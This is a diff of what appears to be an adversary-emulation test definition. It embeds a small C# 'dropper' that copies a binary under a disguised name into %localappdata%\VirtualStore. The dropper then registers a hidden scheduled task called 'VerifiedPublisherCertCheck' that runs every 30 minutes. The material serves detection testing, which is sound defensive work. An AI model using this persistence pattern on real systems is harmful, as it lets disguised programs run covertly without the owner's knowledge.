@@ -30,7 +30,7 @@
           "VirtualStore", "certcheck.exe");; Directory.CreateDirectory(Path.GetDirectoryName(dropPath));;
           File.Copy(sourceExe, dropPath, true);; }; public static void make_some_noise()
           {; ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c schtasks
-          /create /SC MINUTE /MO 30 /TR \"%localappdata%\\VirtualStore\\certcheck.exe\"
+          /create /SC MINUTE /MO 30 /TR %%localappdata%%\\VirtualStore\\certcheck.exe
           /TN VerifiedPublisherCertCheck /F"); {; CreateNoWindow = true,; UseShellExecute
           = false; };; Process.Start(startInfo).WaitForExit();; }; }; ''@; [TopinambourDropper]::unpack_p("C:\Windows\System32\hostname.exe");
           [TopinambourDropper]::make_some_noise()'
@@ -71,4 +71,4 @@
         '
     technique_created: '2019-11-27T14:58:00.429Z'
     atomic_guid: 1a73e89e-a5de-404d-9784-5c2aa0b38a29
-    import_timestamp: '2026-10-20T07:08:27.640149Z'
+    import_timestamp: '2026-10-21T07:01:50.256393Z'
